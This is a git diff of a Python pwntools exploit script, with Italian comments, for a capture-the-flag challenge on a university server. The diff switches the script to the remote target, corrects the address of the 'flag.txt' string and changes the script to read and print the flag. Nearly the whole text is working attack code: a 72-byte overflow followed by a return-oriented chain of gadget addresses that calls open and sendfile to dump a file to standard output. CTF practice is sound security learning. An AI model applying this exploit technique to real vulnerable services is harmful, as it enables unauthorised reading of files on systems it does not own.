@@ -1,6 +1,6 @@
 from pwn import *
 
-REMOTE = False
+REMOTE = True
 
 IP_ADDRESS = "cyberchallenge.disi.unitn.it"
 PORT = 50260
@@ -9,7 +9,7 @@ if(REMOTE):
     conn = remote(IP_ADDRESS, PORT)
 else:
     conn = process('./bin')
-    gdb.attach(conn)
+    #gdb.attach(conn)
 
 offset = 72
 payload = b"A" * offset
@@ -27,13 +27,13 @@ pop_rdx = 0x000000000040119a    #: pop rdx; ret;
 pop_rsi = 0x0000000000401198    #: pop rsi; ret;
 
 file_name = "flag.txt"                      # Ricorda sempre il \x00 finale
-flag_txt_addr = 0x00003020 + 0x400000
-print(hex(flag_txt_addr))
+filename_addr = 0x4020 + 0x400000
+print(hex(filename_addr))
 
 # Idea: Apro il file (syscall 2) e poi copio i contenuti verso lo STDOUT (syscall 40)
 
-payload += p64(pop_rdi) + p64(flag_txt_addr)    # Apro il file flag.txt
-payload += p64(pop_rsi) + p64(0)
+payload += p64(pop_rdi) + p64(filename_addr)    # Apro il file flag.txt
+payload += p64(pop_rsi) + p64(0)                # Flag
 payload += p64(pop_rdx) + p64(0)
 payload += p64(mov_rax_2_syscall)               # Il file aperto, avrà come fd il fd più alto fino al momento + 1
 
@@ -43,14 +43,11 @@ payload += p64(pop_rdi) + p64(1)                # Copio il file verso STDOUT
 payload += p64(pop_rsi) + p64(target_file_fd)
 payload += p64(pop_rdx) + p64(0)
 payload += p64(pop_r10) + p64(100)
-payload += p64(nop_ret)
-payload += p64(mov_rax_40_syscall)              # TODO Gestire adeguatamente il pop rbp
+payload += p64(mov_rax_40_syscall)
 
 conn.sendline(payload)
 
-conn.interactive()
+flag = conn.recvline().decode()
 
-# flag = conn.recvline().decode()
-
-# conn.close()
-# print(flag)
+conn.close()
+print(flag)
